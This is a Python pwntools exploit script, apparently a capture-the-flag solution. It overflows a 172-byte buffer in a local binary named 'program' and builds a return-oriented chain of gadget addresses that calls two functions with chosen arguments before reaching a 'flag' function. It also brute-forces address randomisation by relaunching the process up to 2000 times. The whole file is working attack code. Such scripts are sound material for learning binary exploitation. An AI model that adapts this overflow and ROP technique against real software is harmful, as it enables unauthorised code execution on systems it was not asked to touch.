#!/usr/bin/env python
import pwn
import sys

aslr_offset = 0x5661b1d9 - 0x11d9
"""
0x11d9 -> with objdump func1
0x565561d9 -> start gdb, put a breakpoint, run, disas func1
0x5661b1d9 -> start gdb, put a breakpoint, 'set disable-randomization off', run, disas func1
"""
base_addr = aslr_offset

poppopret = pwn.pack(0x13ba + base_addr)  # gadgets try ROPgadget
poppoppopret = pwn.pack(0x13b9 + base_addr)  # gadgets try ROPgadget

f1 = pwn.pack(0x11d9 + base_addr)
f1arg1 = pwn.pack(0x9c)
f1arg2 = pwn.pack(0x12c)

f2 = pwn.pack(0x121d + base_addr)
f2arg1 = pwn.pack(0x0)
f2arg2 = pwn.pack(0xd)
f2arg3 = pwn.pack(0xd)

flag = pwn.pack(0x1273 + base_addr)
f3arg1 = pwn.pack(0x2)

buff = 'A' * 172

payload = buff + \
    f1 + poppopret + \
    f1arg1 + f1arg2 + \
    f2 + poppoppopret + \
    f2arg1 + f2arg2 + f2arg3 + \
    flag + 'JUNK' + \
    f3arg1

if 2 == len(sys.argv) and 'test' == sys.argv[1]:
    open('payload.txt', 'w').write(payload)
    print(payload)
else:
    elf = pwn.ELF('./program')

    for i in range(1, 2000):
        p = elf.process()
        p.sendline(payload)
        output = p.clean()

        if p.poll() == 0:
            print('Try {} gotcha'.format(i))
            print(output)
            break
        else:
            print('Try {} failed'.format(i))
            p.kill()
